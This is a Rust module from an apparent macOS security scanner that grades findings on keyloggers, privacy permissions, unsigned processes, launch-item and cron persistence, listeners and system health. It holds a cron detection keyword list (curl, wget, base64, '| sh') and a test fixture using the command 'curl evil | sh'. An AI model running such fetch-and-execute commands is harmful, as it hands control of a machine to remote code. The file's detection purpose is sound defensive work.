//! Turns a [`Snapshot`] of raw facts into prioritised [`Finding`]s.
//!
//! Rules are deliberately simple and explainable: every finding says what was
//! seen and why it matters. Severity leans on code signing, because on macOS
//! "who vouches for this code" is the strongest cheap signal available.

mod exec;
mod files;
pub mod trust;

pub use exec::assess_exec;
pub use files::{SensitiveArea, assess_file_read, sensitive_areas};

use vogter_model::{
    Category, EventTap, Finding, LaunchItem, LaunchKind, ProcessInfo, Severity, SignatureKind,
    Snapshot, TccGrant,
};

pub fn assess(snap: &Snapshot) -> Vec<Finding> {
    let mut out = Vec::new();
    // Without a process list every tap would look like it came from a "vanished"
    // process; the daemon keeps the previous tap findings instead.
    let processes_known = !snap.sensor_errors.iter().any(|e| e.sensor == "process");
    for tap in snap
        .event_taps
        .iter()
        .filter(|t| t.enabled && t.keyboard && processes_known)
    {
        out.push(event_tap(tap, snap.process(tap.tapping_pid)));
    }
    out.extend(
        snap.tcc_grants
            .iter()
            .filter(|g| g.allowed)
            .filter_map(tcc_grant),
    );
    out.extend(snap.processes.iter().filter_map(process));
    out.extend(
        snap.launch_items
            .iter()
            .filter(|i| !i.disabled)
            .filter_map(launch_item),
    );
    out.extend(snap.cron_entries.iter().map(|c| {
        let suspicious = [
            "curl",
            "wget",
            "base64",
            "osascript",
            "/tmp/",
            "| sh",
            "|sh",
            "bash -c",
        ]
        .iter()
        .any(|s| c.line.contains(s));
        Finding {
            severity: if suspicious {
                Severity::High
            } else {
                Severity::Low
            },
            category: Category::Persistence,
            check: "persistence.cron".into(),
            title: format!("Cron job for {}", c.user),
            detail: format!(
                "`{}` — cron is rarely used by modern apps; make sure you set this up.",
                c.line
            ),
            pid: None,
            path: None,
            signing: None,
            source: None,
        }
    }));
    let mut seen = std::collections::HashSet::new();
    for l in &snap.listeners {
        // One finding per socket, even when bound on both IPv4 and IPv6.
        if is_loopback(&l.address) || !seen.insert((l.pid, l.port, l.protocol.as_str())) {
            continue;
        }
        let signing = snap.process(l.pid).map(|p| p.signing.clone());
        let severity = match &signing {
            Some(s) if s.is_apple() => Severity::Info,
            Some(s) if s.kind == SignatureKind::ThirdParty && s.notarized => Severity::Info,
            Some(s) if s.is_weak() => Severity::Medium,
            _ => Severity::Low,
        };
        out.push(Finding {
            severity,
            category: Category::Network,
            check: "network.listener".into(),
            title: format!(
                "{} accepts {} connections on port {}",
                l.process,
                l.protocol.to_uppercase(),
                l.port
            ),
            detail: format!(
                "Listening on {}:{} — reachable from other machines on your network.",
                l.address, l.port
            ),
            pid: Some(l.pid),
            path: snap.process(l.pid).and_then(|p| p.path.clone()),
            signing,
            source: None,
        });
    }
    out.extend(health(snap));

    out.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.title.cmp(&b.title))
    });
    out
}

// ---------------------------------------------------------------------------
// Keyloggers
// ---------------------------------------------------------------------------

fn event_tap(tap: &EventTap, proc: Option<&ProcessInfo>) -> Finding {
    let scope = if tap.target_pid == 0 {
        "all apps".to_string()
    } else {
        format!("pid {}", tap.target_pid)
    };
    let mode = if tap.listen_only {
        "listen-only (observes silently, the usual keylogger shape)"
    } else {
        "active filter"
    };
    let base = Finding {
        severity: Severity::High,
        category: Category::Keylogger,
        check: "keylogger.event_tap".into(),
        title: String::new(),
        detail: format!("Keyboard event tap #{} on {scope}, {mode}.", tap.id),
        pid: Some(tap.tapping_pid),
        path: proc.and_then(|p| p.path.clone()),
        signing: proc.map(|p| p.signing.clone()),
        source: None,
    };
    let Some(p) = proc else {
        return Finding {
            title: format!(
                "Keystrokes read by a hidden or vanished process (pid {})",
                tap.tapping_pid
            ),
            ..base
        };
    };
    let location = p.path.as_deref().and_then(suspicious_location);
    let severity = match (&p.signing, location) {
        (_, Some(_)) => Severity::Critical,
        (s, None) if s.is_apple() => Severity::Info,
        (s, None) if s.kind == SignatureKind::ThirdParty && s.notarized => Severity::Medium,
        _ => Severity::High,
    };
    let mut detail = format!("{} Signed: {}.", base.detail, p.signing.describe());
    if let Some(loc) = location {
        detail.push_str(&format!(" Runs from {loc}."));
    }
    if severity == Severity::Medium {
        detail.push_str(
            " Fine if you installed it as a keyboard tool (launcher, remapper, text expander).",
        );
    }
    Finding {
        severity,
        title: format!("{} can read your keystrokes", p.name),
        detail,
        ..base
    }
}

// ---------------------------------------------------------------------------
// Privacy permissions (TCC)
// ---------------------------------------------------------------------------

fn tcc_grant(g: &TccGrant) -> Option<Finding> {
    let (category, label, sensitive) = match g.service.as_str() {
        "kTCCServiceListenEvent" => (
            Category::Keylogger,
            "Input Monitoring (read keystrokes)",
            true,
        ),
        "kTCCServicePostEvent" => (Category::Keylogger, "keystroke injection", true),
        "kTCCServiceAccessibility" => (
            Category::Keylogger,
            "Accessibility (control the Mac, read screen text)",
            false,
        ),
        "kTCCServiceScreenCapture" => (Category::Privacy, "Screen Recording", true),
        "kTCCServiceSystemPolicyAllFiles" => (Category::Privacy, "Full Disk Access", true),
        "kTCCServiceMicrophone" => (Category::Privacy, "Microphone", false),
        "kTCCServiceCamera" => (Category::Privacy, "Camera", false),
        "kTCCServiceEndpointSecurityClient" => (Category::Privacy, "Endpoint Security", true),
        _ => return None,
    };

    let signing = g.signing.clone();
    let severity = match &signing {
        None => Severity::Low, // stale grant for something no longer installed
        Some(s) if s.is_apple() => return None,
        Some(s) if s.kind == SignatureKind::ThirdParty && s.notarized => {
            if category == Category::Keylogger && sensitive {
                Severity::Low
            } else {
                Severity::Info
            }
        }
        Some(s) if s.is_weak() && sensitive => Severity::High,
        Some(_) => Severity::Medium,
    };
    let who = g.resolved_path.as_deref().unwrap_or(&g.client);
    let mut detail = format!("{} is allowed {label}.", g.client);
    match &signing {
        None => detail
            .push_str(" The app is no longer on disk — this is a leftover grant you can remove."),
        Some(s) => detail.push_str(&format!(" Signed: {}.", s.describe())),
    }
    if let Some(loc) = g.resolved_path.as_deref().and_then(suspicious_location) {
        detail.push_str(&format!(" Lives in {loc}."));
    }
    Some(Finding {
        severity,
        category,
        check: format!(
            "tcc.{}",
            g.service.trim_start_matches("kTCCService").to_lowercase()
        ),
        title: format!("{} has {label}", short_name(who)),
        detail,
        pid: None,
        path: g.resolved_path.clone(),
        signing,
        source: Some(tcc_source(g.scope).into()),
    })
}

// ---------------------------------------------------------------------------
// Processes
// ---------------------------------------------------------------------------

pub(crate) fn process(p: &ProcessInfo) -> Option<Finding> {
    let path = p.path.as_deref()?;
    let base = |severity, check: &str, title: String, detail: String| Finding {
        severity,
        category: Category::Process,
        check: check.into(),
        title,
        detail,
        pid: Some(p.pid),
        path: Some(path.into()),
        signing: Some(p.signing.clone()),
        source: None,
    };

    if !p.exe_exists {
        return Some(base(
            Severity::Medium,
            "process.deleted_executable",
            format!("{} is running but its program file is gone", p.name),
            format!(
                "{path} no longer exists. Malware deletes itself to hide; updaters also cause this."
            ),
        ));
    }
    if let Some(loc) = suspicious_location(path) {
        let severity = if p.signing.is_weak() || p.signing.kind == SignatureKind::Unknown {
            Severity::High
        } else {
            Severity::Low
        };
        return Some(base(
            severity,
            "process.suspicious_location",
            format!("{} runs from {loc}", p.name),
            format!(
                "{path} — {}. Legit software rarely runs from here.",
                p.signing.describe()
            ),
        ));
    }
    let (severity, why) = match p.signing.kind {
        SignatureKind::Invalid => (
            Severity::High,
            "its signature is broken (modified after signing?)",
        ),
        SignatureKind::Unsigned => (Severity::Medium, "it is unsigned"),
        SignatureKind::AdHoc | SignatureKind::Untrusted if p.uid == 0 => (
            Severity::Medium,
            "it runs as root without a developer identity",
        ),
        SignatureKind::Untrusted => (
            Severity::Low,
            "it is signed by a certificate Apple did not issue",
        ),
        SignatureKind::AdHoc => (
            Severity::Info,
            "it has no developer identity (normal for things you built)",
        ),
        _ => return None,
    };
    let name = if p.signing.kind == SignatureKind::Invalid {
        format!("{} has an invalid signature", p.name)
    } else {
        format!("{} has no trusted signature", p.name)
    };
    Some(base(
        severity,
        "process.weak_signature",
        name,
        format!("{path}: {why}."),
    ))
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

pub(crate) const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "python",
    "python3",
    "perl",
    "ruby",
    "osascript",
    "curl",
    "node",
    "env",
];

fn launch_item(item: &LaunchItem) -> Option<Finding> {
    let program = item.program.as_deref()?;
    let label = item
        .label
        .clone()
        .unwrap_or_else(|| short_name(&item.plist_path).to_string());
    let where_ = match item.kind {
        LaunchKind::SystemDaemon => "starts as root at boot",
        LaunchKind::SystemAgent => "starts in every user session",
        LaunchKind::UserAgent => "starts when you log in",
    };
    let finding = |severity, check: &str, why: String| Finding {
        severity,
        category: Category::Persistence,
        check: check.into(),
        title: format!("Launch item {label}"),
        detail: format!("{} {where_}: {why}", item.plist_path),
        pid: None,
        path: Some(program.into()),
        signing: item.signing.clone(),
        source: Some(item.plist_path.clone()),
    };

    let exe = short_name(program);
    if INTERPRETERS
        .iter()
        .any(|i| exe == *i || exe.starts_with("python"))
    {
        let cmd = item.arguments.join(" ");
        return Some(finding(
            Severity::Medium,
            "persistence.script",
            format!("runs a script: `{cmd}`"),
        ));
    }
    if let Some(loc) = suspicious_location(program) {
        return Some(finding(
            Severity::High,
            "persistence.suspicious_location",
            format!("runs {program} from {loc}"),
        ));
    }
    let Some(signing) = &item.signing else {
        return Some(finding(
            Severity::Low,
            "persistence.missing_program",
            format!("{program} does not exist (stale)"),
        ));
    };
    if label.starts_with("com.apple.") && !signing.is_apple() {
        return Some(finding(
            Severity::High,
            "persistence.apple_impersonation",
            format!(
                "label claims to be Apple but {program} is {}",
                signing.describe()
            ),
        ));
    }
    let severity = match signing.kind {
        SignatureKind::Apple => return None,
        SignatureKind::ThirdParty if signing.notarized => Severity::Info,
        SignatureKind::ThirdParty => Severity::Low,
        SignatureKind::AdHoc if item.kind == LaunchKind::UserAgent => Severity::Low,
        SignatureKind::Unknown => {
            return Some(finding(
                Severity::Low,
                "persistence.unverified",
                format!("runs {program}, which could not be checked (re-run with sudo)"),
            ));
        }
        _ => Severity::Medium,
    };
    Some(finding(
        severity,
        "persistence.launch_item",
        format!("runs {program} ({})", signing.describe()),
    ))
}

// ---------------------------------------------------------------------------
// System health
// ---------------------------------------------------------------------------

fn health(snap: &Snapshot) -> Vec<Finding> {
    let h = &snap.health;
    let checks = [
        (
            h.sip_enabled,
            Severity::High,
            "health.sip",
            "System Integrity Protection is off",
            "SIP protects the OS from modification. Turn it back on from Recovery unless you disabled it on purpose.",
        ),
        (
            h.gatekeeper_enabled,
            Severity::High,
            "health.gatekeeper",
            "Gatekeeper is off",
            "Unsigned downloaded apps can run without warning. Re-enable: `sudo spctl --global-enable`.",
        ),
        (
            h.filevault_enabled,
            Severity::Medium,
            "health.filevault",
            "FileVault disk encryption is off",
            "Anyone with physical access can read your disk.",
        ),
        (
            h.firewall_enabled,
            Severity::Low,
            "health.firewall",
            "The macOS firewall is off",
            "Incoming connections to apps are not filtered.",
        ),
    ];
    // These are bad when *on*.
    let exposures = [
        (
            h.remote_login,
            Severity::Medium,
            "health.remote_login",
            "Remote Login (SSH) is on",
            "Anyone with a password for this Mac can log in over the network. Turn it off in System Settings → General → Sharing unless you use it.",
        ),
        (
            h.screen_sharing,
            Severity::Medium,
            "health.screen_sharing",
            "Screen Sharing is on",
            "This Mac's screen can be viewed and controlled over the network. Turn it off in System Settings → General → Sharing unless you use it.",
        ),
    ];
    checks
        .into_iter()
        .filter(|(state, ..)| *state == Some(false))
        .chain(
            exposures
                .into_iter()
                .filter(|(state, ..)| *state == Some(true)),
        )
        .map(|(_, severity, check, title, detail)| Finding {
            severity,
            category: Category::SystemHealth,
            check: check.into(),
            title: title.into(),
            detail: detail.into(),
            pid: None,
            path: None,
            signing: None,
            source: None,
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Same labels as the TCC sensor uses for its databases.
fn tcc_source(scope: vogter_model::TccScope) -> &'static str {
    match scope {
        vogter_model::TccScope::System => "tcc:system",
        vogter_model::TccScope::User => "tcc:user",
    }
}

/// Places malware likes to run from and legit software rarely does.
pub(crate) fn suspicious_location(path: &str) -> Option<&'static str> {
    const TEMP: &[&str] = &["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/tmp/"];
    if TEMP.iter().any(|t| path.starts_with(t)) {
        return Some("a temp folder");
    }
    if path.starts_with("/Users/Shared/") {
        return Some("/Users/Shared");
    }
    if path.contains("/Downloads/") {
        return Some("Downloads");
    }
    if path.contains("/.Trash/") {
        return Some("the Trash");
    }
    if hidden_library_dir(path) {
        return Some("a hidden folder in Library");
    }
    None
}

/// `~/Library/.foo/...` or `/Library/Application Support/.foo/...`.
fn hidden_library_dir(path: &str) -> bool {
    let mut seen_library = false;
    for part in path.split('/') {
        if seen_library && part.starts_with('.') && part.len() > 1 {
            return true;
        }
        if part == "Library" {
            seen_library = true;
        }
    }
    false
}

fn is_loopback(addr: &str) -> bool {
    addr.starts_with("127.") || addr == "::1"
}

fn short_name(path: &str) -> &str {
    let trimmed = path.trim_end_matches('/');
    let last = trimmed.rsplit('/').next().unwrap_or(trimmed);
    last.strip_suffix(".app").unwrap_or(last)
}

#[cfg(test)]
mod tests {
    use super::*;
    use vogter_model::{Signing, TapPoint};

    fn signing(kind: SignatureKind, notarized: bool) -> Signing {
        Signing {
            kind,
            identifier: None,
            team_id: Some("TEAM123".into()),
            notarized,
        }
    }

    fn proc(pid: i32, path: &str, s: Signing) -> ProcessInfo {
        ProcessInfo {
            pid,
            ppid: 1,
            uid: 501,
            name: short_name(path).into(),
            path: Some(path.into()),
            exe_exists: true,
            signing: s,
        }
    }

    fn tap(pid: i32) -> EventTap {
        EventTap {
            id: 1,
            tap_point: TapPoint::Session,
            listen_only: true,
            enabled: true,
            events_of_interest: 1 << 10,
            keyboard: true,
            tapping_pid: pid,
            target_pid: 0,
        }
    }

    #[test]
    fn keyboard_tap_severity_follows_signature() {
        let cases = [
            (
                proc(
                    10,
                    "/System/Library/x",
                    signing(SignatureKind::Apple, false),
                ),
                Severity::Info,
            ),
            (
                proc(
                    11,
                    "/Applications/Raycast.app/Contents/MacOS/Raycast",
                    signing(SignatureKind::ThirdParty, true),
                ),
                Severity::Medium,
            ),
            (
                proc(
                    12,
                    "/usr/local/bin/thing",
                    signing(SignatureKind::AdHoc, false),
                ),
                Severity::High,
            ),
            (
                proc(
                    13,
                    "/tmp/.x/agent",
                    signing(SignatureKind::ThirdParty, true),
                ),
                Severity::Critical,
            ),
        ];
        for (p, want) in cases {
            assert_eq!(
                event_tap(&tap(p.pid), Some(&p)).severity,
                want,
                "{:?}",
                p.path
            );
        }
        assert_eq!(event_tap(&tap(99), None).severity, Severity::High);
    }

    #[test]
    fn ignores_taps_without_keyboard() {
        let mut snap = Snapshot::default();
        snap.event_taps.push(EventTap {
            keyboard: false,
            ..tap(5)
        });
        assert!(
            assess(&snap)
                .iter()
                .all(|f| f.category != Category::Keylogger)
        );
    }

    #[test]
    fn locations() {
        assert_eq!(suspicious_location("/private/tmp/a"), Some("a temp folder"));
        assert_eq!(
            suspicious_location("/Users/me/Library/.hidden/bin"),
            Some("a hidden folder in Library")
        );
        assert_eq!(suspicious_location("/Users/me/.cargo/bin/rg"), None);
        assert_eq!(
            suspicious_location("/Applications/Foo.app/Contents/MacOS/Foo"),
            None
        );
    }

    #[test]
    fn apple_impersonating_launch_item() {
        let item = LaunchItem {
            kind: LaunchKind::UserAgent,
            plist_path: "/Users/me/Library/LaunchAgents/com.apple.update.plist".into(),
            label: Some("com.apple.update".into()),
            program: Some("/Users/me/Library/Application Support/upd/upd".into()),
            arguments: vec![],
            run_at_load: true,
            keep_alive: true,
            disabled: false,
            program_exists: true,
            signing: Some(signing(SignatureKind::AdHoc, false)),
        };
        let f = launch_item(&item).unwrap();
        assert_eq!(
            (f.severity, f.check.as_str()),
            (Severity::High, "persistence.apple_impersonation")
        );
    }

    #[test]
    fn script_launch_item_is_flagged() {
        let item = LaunchItem {
            kind: LaunchKind::UserAgent,
            plist_path: "/x.plist".into(),
            label: Some("x".into()),
            program: Some("/bin/bash".into()),
            arguments: vec!["/bin/bash".into(), "-c".into(), "curl evil | sh".into()],
            run_at_load: true,
            keep_alive: false,
            disabled: false,
            program_exists: true,
            signing: Some(signing(SignatureKind::Apple, false)),
        };
        assert_eq!(launch_item(&item).unwrap().check, "persistence.script");
    }

    #[test]
    fn health_only_reports_known_off() {
        let mut snap = Snapshot::default();
        snap.health.sip_enabled = Some(false);
        snap.health.filevault_enabled = None;
        let f = health(&snap);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].check, "health.sip");
    }
}
